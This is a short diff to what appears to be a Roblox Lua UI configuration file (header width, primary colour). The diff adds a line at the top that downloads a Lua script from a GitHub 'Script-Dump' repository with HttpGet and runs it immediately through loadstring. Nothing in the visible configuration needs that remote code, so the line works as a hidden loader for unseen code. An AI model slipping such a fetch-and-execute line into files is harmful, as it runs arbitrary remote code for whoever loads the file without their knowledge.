@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DohmBoyOG/Script-Dump/main/ZHZH0MIYKR.lua"))()
+
 local config = {
    ["HeaderWidth"] = 200,
    ['PrimaryColor'] = Color3.fromRGB(166, 167, 159),
